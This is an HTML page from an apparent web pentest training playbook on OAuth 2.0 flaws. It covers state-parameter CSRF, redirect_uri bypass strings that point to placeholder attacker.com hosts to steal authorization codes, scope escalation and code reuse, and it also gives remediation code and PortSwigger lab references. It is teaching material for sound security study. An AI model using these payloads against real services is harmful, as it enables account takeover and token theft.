@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="OAuth 2.0 vulnerability testing guide: authorization code interception, state parameter bypass, and open redirect exploitation.">
+    <meta property="og:title" content="OAuth 2.0 Vulnerabilities – Web App Pentesting Guide">
+    <meta property="og:description" content="OAuth 2.0 vulnerability testing guide: authorization code interception, state parameter bypass, and open redirect exploitation.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>OAuth 2.0 Vulnerabilities  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">OAuth 2.0 Vulnerabilities</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#how-it-works">How It Works</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A07 · CVSS 9.8 · Day 2</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="7.5" cy="15.5" r="4.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg></span><span>OAuth 2.0 Vulnerabilities</span></h1>
+      <p>Exploit insecure OAuth implementations to hijack user accounts, escalate privileges, or steal sensitive data.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Intermediate-Advanced</span>
+      </div>
+    </div>
+
+    <!-- ═══ ANALOGY ═══ -->
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">The Valet Key Analogy</div>
+        <p>You're at a fancy hotel and hand the valet your car keys. Rather than handing over your full key ring, the concierge gives the valet a special "valet key" that only unlocks the car door and starts the engine ·it can't open the trunk or glove compartment. OAuth works the same way: instead of giving a third-party app your password, you give it a limited-access token. But if the hotel doesn't verify the valet is actually from their service, or if the valet key somehow works on all doors in the parking garage, your security breaks down. Similarly, if OAuth implementations don't properly validate authorization codes, check state parameters, or verify redirect URIs, an attacker can steal codes, impersonate users, or escalate their privileges.</p>
+      </div>
+    </section>
+
+    <!-- ═══ METHODOLOGY ═══ -->
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill deep"><span class="day-num">Day 2</span>Deep Dive</div>
+      <div class="day-pill probe"><span class="day-num">Day 3</span>Continue</div>
+      <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 2  · OAuth Flow Analysis</div>
+      <p>On Day 2, when you encounter an OAuth flow ("Login with Google/GitHub/Facebook"), capture the entire authorization flow in Burp: from the initial redirect to the auth server, through the code exchange, to the final session. Key checkpoints:</p>
+      <ol>
+        <li><strong>State parameter:</strong> Is it present? Is it validated? Drop it and retry → if it works → CSRF on OAuth flow → attacker can link their account to any victim account.</li>
+        <li><strong>redirect_uri:</strong> Try modifying to <code>https://attacker.com</code>  · does the auth server reject it? Try path traversal: <code>https://target.com/../redirect</code>. Try adding params: <code>https://target.com/callback?extra=evil.com</code>.</li>
+        <li><strong>Scope:</strong> Add extra scopes (e.g., <code>admin</code>, <code>read:all</code>)  · does the server grant them?</li>
+      </ol>
+      <pre><code># CSRF on OAuth  · PoC (missing state parameter)
+# Initiate OAuth flow → capture the /authorize URL
+# Send that URL to victim (they click it → their account linked to your OAuth identity)
+
+# redirect_uri bypass attempts
+https://target.com/callback/..%2F..%2Fattacker.com
+https://target.com.attacker.com/callback
+https://target.com/callback?redirect=https://attacker.com</code></pre>
+      <p><strong>Chain it:</strong> OAuth CSRF → link attacker's Google account to victim's app account → log in as victim without their password. Or: redirect_uri bypass → steal authorization code → exchange for access token → full account takeover.</p>
+    </div>
+
+    <!-- ═══ HOW IT WORKS ═══ -->
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p><strong>OAuth 2.0</strong> is an authorization delegation protocol. Instead of giving a third-party app your password, you grant it temporary, limited-scope access to your account on another service (e.g., "Login with Google").</p>
+
+      <h3>The Authorization Code Flow</h3>
+      <p>This is the most common and secure OAuth flow:</p>
+      <ol>
+        <li><strong>User clicks "Login with Google"</strong> on MyApp</li>
+        <li><strong>MyApp redirects to Google's authorization server:</strong> <code>https://accounts.google.com/oauth/authorize?client_id=123&redirect_uri=https://myapp.com/callback&state=random&scope=email+profile</code></li>
+        <li><strong>User logs in and grants consent</strong> on Google's website</li>
+        <li><strong>Google redirects back to MyApp:</strong> <code>https://myapp.com/callback?code=AUTH_CODE&state=random</code></li>
+        <li><strong>MyApp exchanges the code for an access token</strong> (backend to Google, includes client_secret)</li>
+        <li><strong>MyApp receives access_token:</strong> <code>{"access_token": "token123", "token_type": "Bearer"}</code></li>
+        <li><strong>MyApp uses token to fetch user info:</strong> <code>GET /userinfo?access_token=token123</code></li>
+        <li><strong>User is logged in</strong></li>
+      </ol>
+
+      <h3>Key Parameters</h3>
+      <ul>
+        <li><strong>client_id:</strong> Identifies the app requesting access (public, not secret)</li>
+        <li><strong>client_secret:</strong> Secret used by the app to exchange code for token (must be kept private)</li>
+        <li><strong>redirect_uri:</strong> Where the authorization server redirects after user consent. Must match the registered URI exactly</li>
+        <li><strong>code:</strong> Temporary authorization code (valid for seconds to minutes, single-use)</li>
+        <li><strong>state:</strong> Random string to prevent CSRF attacks. Must match between request and response</li>
+        <li><strong>scope:</strong> Permissions being requested (email, profile, payment info, etc.)</li>
+        <li><strong>access_token:</strong> Bearer token used to access protected resources</li>
+      </ul>
+
+      <h3>Vulnerability Types</h3>
+
+      <h4>1. Missing State Parameter</h4>
+      <p>If the app doesn't use the <code>state</code> parameter, CSRF attacks are possible. An attacker can forge a link that completes OAuth flow on their own account, then trick a victim into clicking it, linking the attacker's OAuth account to the victim's session.</p>
+
+      <h4>2. Weak State Parameter</h4>
+      <p>If <code>state</code> is predictable (sequential, timestamp-based, or hardcoded), an attacker can forge valid state values.</p>
+
+      <h4>3. State Not Validated</h4>
+      <p>If the application doesn't check that the returned state matches the one sent, attackers can inject a different code with a forged state.</p>
+
+      <h4>4. Redirect URI Not Validated</h4>
+      <p>If the application allows flexible redirect_uri values, an attacker can redirect the authorization code to their own server:</p>
+      <pre><code>// Attacker changes redirect_uri to their domain
+GET https://google.com/oauth/authorize?
+  client_id=legitimate_app&
+  redirect_uri=https://attacker.com/steal&
+  scope=email+profile&
+  state=xyz
+
+// Code is sent to attacker instead of legitimate app:
+GET https://attacker.com/steal?code=STOLEN_CODE&state=xyz</code></pre>
+
+      <h4>5. Implicit Flow Token Leakage</h4>
+      <p>The Implicit flow (legacy) returns access tokens directly in the URL fragment, which can be logged, stored in browser history, or leaked to third parties.</p>
+
+      <h4>6. Account Hijacking via Email Reuse</h4>
+      <p>If the app doesn't re-verify the email returned by OAuth, an attacker can register an account with OAuth (using Google), and if a victim later tries to link their Google account, the attacker's account gets linked instead.</p>
+
+      <h4>7. Scope Escalation</h4>
+      <p>An attacker modifies the OAuth request to request elevated scopes (e.g., <code>scope=email+profile+payment</code>) instead of the legitimate app's scopes.</p>
+
+      <h4>8. Open Redirect on Authorization Server</h4>
+      <p>If the authorization server has an open redirect vulnerability, an attacker can redirect the user to a phishing page before the authorization code is sent.</p>
+    </section>
+
+    <!-- ═══ WHERE TO LOOK ═══ -->
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>OAuth vulnerabilities appear on login pages and authorization endpoints. Search for "Login with Google/GitHub/Facebook" buttons and authorization flows:</p>
+
+      <h3>Key Locations</h3>
+      <ul>
+        <li><strong>Login Pages:</strong> "Sign in with Google", "Sign in with GitHub", "Sign in with Facebook"</li>
+        <li><strong>Account Linking Pages:</strong> Settings where users can link OAuth providers to their account</li>
+        <li><strong>Authorization Endpoints:</strong> <code>/oauth/authorize</code>, <code>/auth/authorize</code>, <code>/login/oauth</code></li>
+        <li><strong>Callback Endpoints:</strong> <code>/oauth/callback</code>, <code>/auth/callback</code>, <code>/login/callback</code></li>
+        <li><strong>Token Exchange Endpoints:</strong> <code>/oauth/token</code> (usually backend only)</li>
+      </ul>
+
+      <h3>Testing Approach</h3>
+      <ol>
+        <li>Initiate OAuth login flow and capture the authorization request</li>
+        <li>Examine the <code>state</code> parameter (is it present? is it random?)</li>
+        <li>Examine the <code>redirect_uri</code> parameter (does it point to the app's domain?)</li>
+        <li>Examine the <code>scope</code> parameter (what permissions are requested?)</li>
+        <li>Complete the flow and intercept the callback URL</li>
+        <li>Check if the state in the response matches the state in the request</li>
+      </ol>
+    </section>
+
+    <!-- ═══ BURP WORKFLOW ═══ -->
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Initiate OAuth Flow</strong><br>
+          Click the "Login with [Provider]" button on the target site. Burp should capture the redirect to the authorization server. If not, use Proxy → Intercept to capture it.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Examine Authorization Request</strong><br>
+          In Repeater, examine the authorization URL. Look for state, redirect_uri, client_id, scope. Note the values.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Test State Parameter</strong><br>
+          Drop the request to the authorization server (don't complete the redirect). Initiate the flow again and try dropping it at a different stage. Try modifying the state parameter (change it to a different value) and see if the app complains.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Test Redirect URI Validation</strong><br>
+          Try modifying the redirect_uri parameter to point to attacker.com or a different subdomain. Complete the flow and see if the authorization code is sent to your modified URI instead of the legitimate app.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Test Scope Escalation</strong><br>
+          Modify the scope parameter to request elevated permissions (e.g., change <code>scope=email</code> to <code>scope=email+profile+payment</code>). Consent and see if the app accepts the elevated scope.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Intercept Callback</strong><br>
+          After user consents, intercept the callback request to your app. Examine the code and state parameters. Note if state was validated.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Test Code Reuse</strong><br>
+          Capture an authorization code, then try reusing it in another request. If accepted, this indicates the code wasn't invalidated after first use.
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOADS ═══ -->
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>State Parameter CSRF Attack</h3>
+      <p>If state is missing or not validated, craft a CSRF attack:</p>
+
+      <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;img src="https://myapp.com/oauth/authorize?
+  client_id=legitimate_app&
+  redirect_uri=https://myapp.com/callback&
+  state=arbitrary_value&
+  scope=email+profile" /&gt;
+
+&lt;!-- When victim visits this page, OAuth flow initiates with attacker-controlled state --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+      <h3>Redirect URI Manipulation</h3>
+      <p>If the authorization server allows flexible redirect_uri, steal the authorization code:</p>
+
+      <pre><code>// Step 1: Craft malicious authorization URL
+GET https://accounts.google.com/oauth/authorize?
+  client_id=legitimate_app&
+  redirect_uri=https://attacker.com/steal&
+  state=xyz&
+  scope=email+profile
+
+// Step 2: Attacker's /steal endpoint receives:
+GET https://attacker.com/steal?code=STOLEN_CODE&state=xyz
+
+// Step 3: Exchange code for token using legitimate_app's client_secret
+POST https://accounts.google.com/oauth/token
+  client_id=legitimate_app&
+  client_secret=SECRET&
+  code=STOLEN_CODE&
+  redirect_uri=https://attacker.com/steal</code></pre>
+
+      <h3>Scope Escalation</h3>
+      <p>Modify the scope parameter to request elevated permissions:</p>
+
+      <pre><code>// Original
+GET https://accounts.google.com/oauth/authorize?
+  client_id=app&
+  scope=email
+
+// Modified (escalated)
+GET https://accounts.google.com/oauth/authorize?
+  client_id=app&
+  scope=email+profile+payment</code></pre>
+
+      <h3>Authorization Code Interception</h3>
+      <p>Intercept the callback URL containing the authorization code:</p>
+
+      <pre><code>// Callback URL (captured in browser):
+GET https://myapp.com/callback?code=AUTH_CODE&state=xyz
+
+// Extract the code and exchange it for access_token
+POST /oauth/token
+  code=AUTH_CODE&
+  client_id=app&
+  client_secret=secret&
+  redirect_uri=https://myapp.com/callback</code></pre>
+
+      <h3>Testing Redirect URI Variations</h3>
+      <p>If the app validates redirect_uri with a regex or prefix matching, bypass it:</p>
+
+      <pre><code>// Original redirect_uri: https://myapp.com/callback
+// Attacker tries:
+https://attacker.com?redirect_to=https://myapp.com/callback
+https://myapp.com.attacker.com/callback
+https://myapp.com:@attacker.com/callback
+https://myapp.com@attacker.com/callback
+https://myapp.com%2e%61ttacker.com
+https://myapp.com#attacker.com</code></pre>
+
+      <h3>Account Linking via Email Reuse</h3>
+      <p>If app doesn't verify email during OAuth linking:</p>
+
+      <pre><code>// Step 1: Create attacker account on app
+// Step 2: During OAuth linking, intercept and change email in response
+// Step 3: If app trusts the OAuth provider's email without re-verification,
+//         attacker's account gets linked to victim's email</code></pre>
+    </section>
+
+    <!-- ═══ CHECKLIST ═══ -->
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <strong>OAuth 2.0 Vulnerability Tests</strong>
+          <span class="progress-mini"><span>0</span>/12</span>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Identify all OAuth providers on the login page (Google, GitHub, Facebook, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Capture the authorization request and examine the <code>state</code> parameter</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Verify that state is random and cryptographically secure (not predictable, hardcoded, or sequential)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Test state validation: modify state in request and verify the app rejects mismatched state in response</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Test redirect_uri validation: attempt to change it to attacker.com or a subdomain</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Test redirect_uri parser confusion: try variations (port confusion, subdomain injection, URL encoding)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Test scope escalation: modify scope parameter to request elevated permissions</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Capture the authorization code and test if it's reusable or single-use</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Test account linking functionality: verify email re-verification during OAuth account link</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Check for open redirects on the authorization server itself</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Test PKCE (Proof Key for Public Clients): if absent, this may indicate vulnerability to code interception</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c12">
+          <label for="c12">Document which OAuth endpoints and scopes are supported by the application</label>
+        </div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+      </div>
+    </section>
+
+    <!-- ═══ WAF BYPASS ═══ -->
+    <section id="waf-bypass">
+      <h2>WAF Bypass & Variations</h2>
+
+      <h3>Redirect URI Parser Confusion</h3>
+      <p>Different systems parse URLs differently. Exploit this discrepancy:</p>
+      <ul>
+        <li><strong>Port confusion:</strong> <code>https://myapp.com:8080@attacker.com</code> (@ is treated as userinfo separator)</li>
+        <li><strong>Fragment usage:</strong> <code>https://myapp.com#attacker.com</code> (fragment might be ignored)</li>
+        <li><strong>Path injection:</strong> <code>https://attacker.com/myapp.com</code> (if regex only checks prefix)</li>
+        <li><strong>Subdomain wildcards:</strong> <code>https://xxx.myapp.com</code> (if app trusts *.myapp.com)</li>
+        <li><strong>URL encoding:</strong> <code>https://attacker.com%2fmyapp.com</code> (double encoding confusion)</li>
+        <li><strong>Case sensitivity:</strong> <code>https://MyApp.com</code> vs <code>https://myapp.com</code></li>
+      </ul>
+
+      <h3>State Parameter Bypass</h3>
+      <ul>
+        <li><strong>Hardcoded state:</strong> If the app always uses the same state value, CSRF is possible</li>
+        <li><strong>Null state:</strong> Some implementations might accept state=null or state="" (unlikely but test)</li>
+        <li><strong>Empty state:</strong> Try removing the state parameter entirely</li>
+      </ul>
+
+      <h3>Scope Escalation Variations</h3>
+      <p>Try different separator formats:</p>
+      <pre><code>// Typical
+scope=email+profile
+
+// Try alternatives
+scope=email%20profile
+scope=email,profile
+scope=email profile
+scope=email;profile</code></pre>
+
+      <h3>Authorization Server Open Redirects</h3>
+      <p>If the authorization server itself has an open redirect vulnerability in parameters like <code>login_hint</code> or <code>display</code>, exploit that to create a phishing chain.</p>
+    </section>
+
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Exploitation Scenarios</h3>
+
+      <h4>Account Takeover via State Parameter CSRF</h4>
+      <p>If state is missing or not validated, an attacker can trick a victim into clicking a malicious link that initiates OAuth with the attacker-controlled state. The authorization code is sent back with the attacker's state value, allowing the attacker to intercept and use it.</p>
+
+      <h4>Redirect URI Bypass to Code Theft</h4>
+      <p>An attacker modifies the redirect_uri to point to their server. The authorization code is sent to the attacker instead of the legitimate app. Using the client_id and client_secret (if not protected), the attacker exchanges the code for an access token and impersonates the user.</p>
+
+      <h4>Unauthorized Scope Escalation</h4>
+      <p>An attacker requests elevated scopes (payment info, admin functions, data export) on behalf of a user. If the user is not notified of the escalation, the attacker gains access to sensitive functions.</p>
+
+      <h4>Account Linking Hijacking</h4>
+      <p>During account linking, if email is not re-verified, an attacker can link their OAuth account to a victim's email, taking over the account.</p>
+
+      <h4>Authorization Code Reuse</h4>
+      <p>If authorization codes are not invalidated after use or if they don't expire quickly, an attacker can replay captured codes.</p>
+
+      <h3>Real-World Example</h3>
+      <p>A travel app uses "Login with Google" but doesn't validate the state parameter. An attacker sends a malicious link to users: <code>https://travel-app.com/oauth/authorize?state=attacker_value&...&redirect_uri=https://attacker.com</code>. When victims click, their authorization code is sent to the attacker's server. The attacker uses the code to create an account linked to the victim's Google identity, gaining access to the victim's travel history, bookings, and payment methods.</p>
+
+      <h3>Impact</h3>
+      <ul>
+        <li><strong>Critical:</strong> Account takeover, privilege escalation, unauthorized access to sensitive features</li>
+        <li><strong>High:</strong> Unauthorized scope access, email re-binding without verification</li>
+        <li><strong>Medium:</strong> CSRF, state parameter not validated, authorization code not single-use</li>
+      </ul>
+    </section>
+
+    <!-- ═══ REMEDIATION ═══ -->
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Always Use and Validate State Parameter</h3>
+      <p>Generate a cryptographically random state value for each authorization request and validate it in the callback:</p>
+
+      <pre><code>// Server-side: Generate random state
+state = secureRandomBytes(32).toString('hex');
+session.state = state;
+
+// Send authorization request
+redirect(authServer + '?state=' + state + '...');
+
+// Callback: Validate state
+if (request.state !== session.state) {
+  throw new Error('State mismatch - CSRF detected');
+}</code></pre>
+
+      <h3>2. Strictly Validate Redirect URI</h3>
+      <p>Never allow flexible redirect_uri values. Use an exact match against a whitelist:</p>
+
+      <pre><code>const ALLOWED_REDIRECTS = [
+  'https://myapp.com/oauth/callback',
+  'https://api.myapp.com/oauth/callback'
+];
+
+if (!ALLOWED_REDIRECTS.includes(request.redirectUri)) {
+  throw new Error('Invalid redirect_uri');
+}</code></pre>
+
+      <h3>3. Use PKCE for Public Clients</h3>
+      <p>Proof Key for Code Exchange (PKCE) adds an extra layer of security by making authorization codes useless if stolen:</p>
+
+      <pre><code>// Client generates code_verifier and code_challenge
+code_verifier = secureRandomBytes(32).toString('base64url');
+code_challenge = sha256(code_verifier).toString('base64url');
+
+// Send authorization with code_challenge
+GET /authorize?code_challenge=...&code_challenge_method=S256
+
+// Exchange code with code_verifier
+POST /token
+  code=...&
+  code_verifier=...</code></pre>
+
+      <h3>4. Re-verify Email During Account Linking</h3>
+      <p>Never trust the email from OAuth without re-verification:</p>
+
+      <pre><code>// After OAuth, send verification email
+email = oauthResponse.email;
+verificationToken = generateToken();
+sendVerificationEmail(email, verificationToken);
+
+// Only link account after email verification
+if (verificationToken === request.token) {
+  linkAccount(user, oauthIdentity);
+}</code></pre>
+
+      <h3>5. Enforce Single-Use Authorization Codes</h3>
+      <p>Invalidate authorization codes immediately after use and set short expiration (30 seconds):</p>
+
+      <pre><code>// Generate code with expiry
+code = {
+  value: secureRandom(),
+  expiresAt: now + 30000,
+  used: false
+};
+
+// Validate on exchange
+if (code.used || code.expiresAt < now) {
+  throw new Error('Code invalid or expired');
+}
+code.used = true;</code></pre>
+
+      <h3>6. Minimize Scopes Requested</h3>
+      <p>Only request scopes absolutely necessary for functionality. Let users see and approve requested permissions.</p>
+
+      <h3>7. Use Authorization Server Securely</h3>
+      <ul>
+        <li>Keep client_secret truly secret (never expose in client-side code)</li>
+        <li>Use HTTPS for all OAuth endpoints</li>
+        <li>Validate authorization server certificates</li>
+      </ul>
+
+      <h3>8. Implement Secure Session Management</h3>
+      <p>After successful OAuth authentication, create a secure session token and don't rely solely on the OAuth access token:</p>
+
+      <pre><code>// After OAuth succeeds
+sessionToken = generateSecureToken();
+session[sessionToken] = {
+  user: oauthUser,
+  expiresAt: now + 3600000
+};
+
+// Subsequent requests use sessionToken, not OAuth token</code></pre>
+    </section>
+
+    <!-- ═══ LABS ═══ -->
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>PortSwigger Web Security Academy includes approximately 6 OAuth 2.0 labs:</p>
+      <ul>
+        <li>Authentication bypass via OAuth implicit flow</li>
+        <li>Forced OAuth profile linking</li>
+        <li>OAuth account hijacking via redirect_uri misconfiguration</li>
+        <li>OAuth account hijacking via CSRF state parameter validation</li>
+        <li>Stealing OAuth access tokens via a proxy page</li>
+        <li>OAuth 2.0 authentication bypass via scope injection</li>
+      </ul>
+      <p>Work through these labs to understand how OAuth state validation, redirect_uri validation, and scope handling can be exploited. Focus on recognizing CSRF vulnerabilities in OAuth flows and understanding how redirects can be manipulated.</p>
+    </section>
+
+    <!-- ═══ COMMON MISTAKES ═══ -->
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <h3>Not Testing State Parameter Thoroughly</h3>
+      <p><strong>Mistake:</strong> Checking if state exists but not testing if it's actually validated.</p>
+      <p><strong>Fix:</strong> Modify the state value in both the request and response. If the flow still completes, state is not being validated. This is a CSRF vulnerability.</p>
+
+      <h3>Assuming Redirect URI Validation is Strict</h3>
+      <p><strong>Mistake:</strong> Trying only attacker.com and giving up when it's rejected, without testing variations.</p>
+      <p><strong>Fix:</strong> Test parser confusion techniques: subdomains, ports, URL encoding, fragments, path injection. Different systems parse URLs differently.</p>
+
+      <h3>Not Checking for PKCE Implementation</h3>
+      <p><strong>Mistake:</strong> Assuming PKCE is always used, or not understanding its absence indicates vulnerability.</p>
+      <p><strong>Fix:</strong> Check if code_challenge and code_verifier are used. If absent, code interception is more dangerous. Note this in your report.</p>
+
+      <h3>Overlooking Email Re-verification**</h3>
+      <p><strong>Mistake:</strong> Not testing the account linking feature or assuming email is automatically re-verified.</p>
+      <p><strong>Fix:</strong> Test account linking by intercepting the OAuth response and changing the email. If the app links without re-verification, this is a critical vulnerability.</p>
+
+      <h3>Not Testing Code Reuse**</h3>
+      <p><strong>Mistake:</strong> Assuming authorization codes are always single-use and expiring quickly.</p>
+      <p><strong>Fix:</strong> Capture an authorization code, exchange it, then try exchanging the same code again. If it works, code reuse is possible.</p>
+
+      <h3>Giving Up on Scope Escalation**</h3>
+      <p><strong>Mistake:</strong> Testing only the exact scopes the app requests, not attempting to escalate.</p>
+      <p><strong>Fix:</strong> Always try adding extra scopes (payment, admin, export, etc.). If the app accepts them without special notification, this is a vulnerability.</p>
+
+      <h3>Not Testing All OAuth Providers**</h3>
+      <p><strong>Mistake:</strong> Testing only one provider (Google) and assuming others have the same implementation.</p>
+      <p><strong>Fix:</strong> Test every OAuth provider on the login page. Each may have different validation logic.</p>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>OAuth vulnerabilities often chain with other auth issues for full account takeover.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="jwt.html"><span class="sa-icon">🎫</span><span class="sa-name">JWT Attacks</span><span class="sa-why">OAuth access tokens are often JWTs. A weak JWT secret = forge tokens without going through the OAuth flow at all.</span></a>
+      <a class="see-also-card" href="csrf.html"><span class="sa-icon">🎭</span><span class="sa-name">CSRF</span><span class="sa-why">Missing state parameter = CSRF on the OAuth flow. Attacker triggers authorization and links their identity to victim's account.</span></a>
+      <a class="see-also-card" href="cors.html"><span class="sa-icon">🌍</span><span class="sa-name">CORS</span><span class="sa-why">CORS on the token endpoint lets attacker read the access token from cross-origin requests.</span></a>
+      <a class="see-also-card" href="host-header.html"><span class="sa-icon">🏷️</span><span class="sa-name">Host Header</span><span class="sa-why">Host header injection in the authorization request can redirect the OAuth code to attacker's domain.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
